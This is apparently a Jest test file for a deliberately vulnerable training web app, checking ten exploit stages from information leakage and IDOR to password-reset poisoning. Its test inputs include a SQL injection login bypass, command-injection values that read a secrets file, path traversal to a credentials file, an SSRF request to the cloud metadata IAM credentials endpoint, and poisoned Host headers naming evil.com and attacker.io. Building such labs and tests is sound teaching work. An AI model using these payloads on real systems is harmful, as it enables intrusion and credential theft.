'use strict';
const sessionManager = require('../../src/db/session-manager');
const { handleRequest } = require('../../src/webapp/vulnerable-app');

let sessionId;

beforeAll(() => {
  sessionManager.createTemplate();
  sessionId = sessionManager.createSession();
});

afterAll(() => {
  sessionManager.destroySession(sessionId);
});

function req(method, url, body = null, stage = undefined, headers = {}) {
  return handleRequest(method, url, body, sessionId, stage, headers);
}

// ─── Route gating ─────────────────────────────────────────────────────────────
describe('route gating', () => {
  it('allows index at any stage', () => {
    expect(req('GET', '/', null, 0).status).toBe(200);
    expect(req('GET', '/', null, 3).status).toBe(200);
  });

  it('returns 404 for route not available at current stage', () => {
    // /api/employees only available at stage 1
    const res = req('GET', '/api/employees/1', null, 0);
    expect(res.status).toBe(404);
  });

  it('allows route when stage matches', () => {
    const res = req('GET', '/api/employees/1', null, 1);
    expect(res.status).toBe(200);
  });

  it('returns 404 for completely unknown route', () => {
    const res = req('GET', '/nonexistent', null, undefined);
    expect(res.status).toBe(404);
  });
});

// ─── Stage 1: Information Leakage ─────────────────────────────────────────────
describe('Stage 1 — Information Leakage', () => {
  it('GET /login returns login page with HTML comment containing credentials', () => {
    const res = req('GET', '/login', null, 0);
    expect(res.status).toBe(200);
    expect(res.body).toContain('admin');
    expect(res.body).toContain('password123');
  });

  it('POST /login with admin/password123 returns dashboard and sets stageFlag', () => {
    const res = req('POST', '/login', 'user=admin&pass=password123', 0);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('sk-megacorp-9f3k2j5h8d');
    expect(res.loginSuccess).toBe(true);
  });

  it('POST /login with wrong credentials returns 401', () => {
    const res = req('POST', '/login', 'user=admin&pass=wrongpass', 0);
    expect(res.status).toBe(401);
    expect(res.stageFlag).toBeUndefined();
  });

  it('POST /login as non-admin user (jsmith) succeeds but no stageFlag', () => {
    const res = req('POST', '/login', 'user=jsmith&pass=p%40ssw0rd123', 0);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
    expect(res.loginSuccess).toBe(true);
  });

  it('POST /login with empty credentials returns 401', () => {
    const res = req('POST', '/login', 'user=&pass=', 0);
    expect(res.status).toBe(401);
  });
});

// ─── Stage 2: IDOR ────────────────────────────────────────────────────────────
describe('Stage 2 — IDOR', () => {
  it('GET /api/employees/1 returns profile without stageFlag', () => {
    const res = req('GET', '/api/employees/1', null, 1);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
  });

  it('GET /api/employees/4 (admin) returns profile with stageFlag', () => {
    const res = req('GET', '/api/employees/4', null, 1);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('pat_adm_Xf9mK2pLqR47');
  });

  it('GET /api/employees/999 returns 404', () => {
    const res = req('GET', '/api/employees/999', null, 1);
    expect(res.status).toBe(404);
  });

  it('profile page contains personal token for admin', () => {
    const res = req('GET', '/api/employees/4', null, 1);
    expect(res.body).toContain('pat_adm_Xf9mK2pLqR47');
  });
});

// ─── Stage 3: XSS ─────────────────────────────────────────────────────────────
describe('Stage 3 — XSS', () => {
  it('GET /api/search?q=test returns search results without stageFlag', () => {
    const res = req('GET', '/api/search?q=test', null, 2);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
  });

  it('search result reflects unescaped query in response (XSS vector exists)', () => {
    const res = req('GET', '/api/search?q=<b>test</b>', null, 2);
    expect(res.body).toContain('<b>test</b>');
  });

  it('script tag + document.cookie triggers stageFlag', () => {
    const q = encodeURIComponent('<script>document.cookie</script>');
    const res = req('GET', `/api/search?q=${q}`, null, 2);
    expect(res.stageFlag).toBe('admin_token_7f3k9x');
  });

  it('stealCookie() payload triggers stageFlag', () => {
    const q = encodeURIComponent('<script>stealCookie()</script>');
    const res = req('GET', `/api/search?q=${q}`, null, 2);
    expect(res.stageFlag).toBe('admin_token_7f3k9x');
  });

  it('Set-Cookie header is present on search responses', () => {
    const res = req('GET', '/api/search?q=anything', null, 2);
    expect(res.headers['Set-Cookie']).toContain('admin_token_7f3k9x');
  });

  it('plain HTML injection without JS does not trigger stageFlag', () => {
    const q = encodeURIComponent('<b>hello</b>');
    const res = req('GET', `/api/search?q=${q}`, null, 2);
    expect(res.stageFlag).toBeUndefined();
  });
});

// ─── Stage 4: SQL Injection ───────────────────────────────────────────────────
describe('Stage 4 — SQL Injection', () => {
  it('GET /api/admin/login returns login form', () => {
    const res = req('GET', '/api/admin/login', null, 3);
    expect(res.status).toBe(200);
    expect(res.body).toContain('Admin');
  });

  it('POST with valid credentials logs in without stageFlag (not an exploit)', () => {
    const res = req('POST', '/api/admin/login', 'user=admin&pass=admin123', 3);
    if (res.status === 200) {
      expect(res.stageFlag).toBeUndefined();
    }
  });

  it("POST with ' triggers SQL error", () => {
    const res = req('POST', '/api/admin/login', "user='&pass=x", 3);
    expect(res.status).toBe(500);
  });

  it("POST with ' OR 1=1 -- bypasses auth and sets stageFlag", () => {
    const res = req('POST', '/api/admin/login', "user=' OR 1=1 --&pass=x", 3);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('Pr0d_DB_M@st3r_Xk9m');
  });

  it("admin panel body contains DB master password", () => {
    const res = req('POST', '/api/admin/login', "user=' OR 1=1 --&pass=x", 3);
    expect(res.body).toContain('Pr0d_DB_M@st3r_Xk9m');
  });

  it('wrong credentials return 401', () => {
    const res = req('POST', '/api/admin/login', 'user=nobody&pass=wrong', 3);
    expect(res.status).toBe(401);
  });
});

// ─── Stage 5: Command Injection ───────────────────────────────────────────────
describe('Stage 5 — Command Injection', () => {
  it('GET /api/diagnostic without host shows form', () => {
    const res = req('GET', '/api/diagnostic', null, 4);
    expect(res.status).toBe(200);
    expect(res.body).toContain('diagnostic');
  });

  it('GET /api/diagnostic?host=localhost shows ping output', () => {
    const res = req('GET', '/api/diagnostic?host=localhost', null, 4);
    expect(res.status).toBe(200);
    expect(res.body).toContain('ping');
    expect(res.stageFlag).toBeUndefined();
  });

  it('command injection with semicolon reads secrets file and sets stageFlag', () => {
    const host = encodeURIComponent('localhost;cat /etc/secrets/api_keys.txt');
    const res = req('GET', `/api/diagnostic?host=${host}`, null, 4);
    expect(res.stageFlag).toBe('AKIA3R9F8GHSL29XKMP4');
  });

  it('command injection with && also triggers stageFlag', () => {
    const host = encodeURIComponent('localhost&&cat /etc/secrets/api_keys.txt');
    const res = req('GET', `/api/diagnostic?host=${host}`, null, 4);
    expect(res.stageFlag).toBe('AKIA3R9F8GHSL29XKMP4');
  });

  it('partial injection without reading secrets does not set stageFlag', () => {
    const host = encodeURIComponent('localhost;whoami');
    const res = req('GET', `/api/diagnostic?host=${host}`, null, 4);
    expect(res.stageFlag).toBeUndefined();
  });
});

// ─── Stage 6: Price Manipulation ─────────────────────────────────────────────
describe('Stage 6 — Price Manipulation', () => {
  it('POST /shop/orders with full price places order without stageFlag', () => {
    const res = req('POST', '/shop/orders', 'item=Laptop+Pro&price=999.00&quantity=1', 5);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
  });

  it('POST /shop/orders with price=0.01 triggers stageFlag', () => {
    const res = req('POST', '/shop/orders', 'item=Laptop+Pro&price=0.01&quantity=1', 5);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('DEAL-Xk9mP2rL');
    expect(res.body).toContain('DEAL-Xk9mP2rL');
  });

  it('POST /shop/orders with price=0 does not trigger stageFlag (must be > 0)', () => {
    const res = req('POST', '/shop/orders', 'item=Laptop+Pro&price=0&quantity=1', 5);
    expect(res.stageFlag).toBeUndefined();
  });
});

// ─── Stage 7: Directory Traversal ─────────────────────────────────────────────
describe('Stage 7 — Directory Traversal', () => {
  it('GET /shop/image?file=laptop.jpg returns image', () => {
    const res = req('GET', '/shop/image?file=laptop.jpg', null, 6);
    expect(res.status).toBe(200);
  });

  it('GET /shop/image with no file param returns 400', () => {
    const res = req('GET', '/shop/image', null, 6);
    expect(res.status).toBe(400);
  });

  it('GET /shop/image with path traversal to credentials.json triggers stageFlag', () => {
    const res = req('GET', '/shop/image?file=../admin/credentials.json', null, 6);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('VAULT-Wm3nK8xR');
  });

  it('two-level traversal also triggers stageFlag', () => {
    const res = req('GET', '/shop/image?file=../../admin/credentials.json', null, 6);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('VAULT-Wm3nK8xR');
  });

  it('traversal to non-existent file returns 404', () => {
    const res = req('GET', '/shop/image?file=../nothing.txt', null, 6);
    expect(res.status).toBe(404);
  });
});

// ─── Stage 8: SSRF ───────────────────────────────────────────────────────────
describe('Stage 8 — SSRF', () => {
  it('GET /shop/seller/import shows import form', () => {
    const res = req('GET', '/shop/seller/import', null, 7);
    expect(res.status).toBe(200);
  });

  it('POST with no URL returns 400', () => {
    const res = req('POST', '/shop/seller/import', '', 7);
    expect(res.status).toBe(400);
  });

  it('POST with invalid URL returns 400', () => {
    const res = req('POST', '/shop/seller/import', 'url=not-a-url', 7);
    expect(res.status).toBe(400);
  });

  it('POST with normal external URL fetches simulated product data, no stageFlag', () => {
    const res = req('POST', '/shop/seller/import', 'url=http%3A%2F%2Fexample.com%2Fproduct.json', 7);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
  });

  it('POST with AWS metadata base URL returns metadata listing', () => {
    const url = 'url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F';
    const res = req('POST', '/shop/seller/import', url, 7);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
    expect(res.body).toContain('iam');
  });

  it('POST with IAM credentials endpoint triggers stageFlag', () => {
    const path = '/latest/meta-data/iam/security-credentials/pixelmart-ec2-role';
    const url = `url=${encodeURIComponent(`http://169.254.169.254${path}`)}`;
    const res = req('POST', '/shop/seller/import', url, 7);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('SSRF-Pw2kX9mV');
    expect(res.body).toContain('SSRF-Pw2kX9mV');
  });
});

// ─── Stage 9: Mass Assignment ─────────────────────────────────────────────────
describe('Stage 9 — Mass Assignment', () => {
  it('GET /shop/register shows registration form', () => {
    const res = req('GET', '/shop/register', null, 8);
    expect(res.status).toBe(200);
  });

  it('POST with normal fields creates user account, no stageFlag', () => {
    const res = req('POST', '/shop/register', 'username=alice&email=alice%40example.com&password=secret', 8);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
    expect(res.body).toContain('user');
  });

  it('POST with role=admin creates admin account and sets stageFlag', () => {
    const res = req('POST', '/shop/register', 'username=hacker&email=hack%40evil.com&password=pw&role=admin', 8);
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('ADMIN-Bv2nR6tK');
    expect(res.body).toContain('ADMIN-Bv2nR6tK');
  });
});

// ─── Stage 10: Password Reset Poisoning ──────────────────────────────────────
describe('Stage 10 — Password Reset Poisoning', () => {
  it('GET /shop/reset shows reset form', () => {
    const res = req('GET', '/shop/reset', null, 9);
    expect(res.status).toBe(200);
  });

  it('POST with default host sends normal reset, no stageFlag', () => {
    const res = req('POST', '/shop/reset', 'email=admin%40pixelmart.com', 9, { host: 'portal.megacorp.internal' });
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBeUndefined();
  });

  it('POST with poisoned Host header triggers stageFlag', () => {
    const res = req('POST', '/shop/reset', 'email=admin%40pixelmart.com', 9, { host: 'evil.com' });
    expect(res.status).toBe(200);
    expect(res.stageFlag).toBe('RESET-Hy8kM4vP');
    expect(res.body).toContain('RESET-Hy8kM4vP');
    expect(res.body).toContain('evil.com');
  });

  it('poisoned reset URL contains the attacker host', () => {
    const res = req('POST', '/shop/reset', 'email=admin%40pixelmart.com', 9, { host: 'attacker.io' });
    expect(res.body).toContain('attacker.io');
  });
});
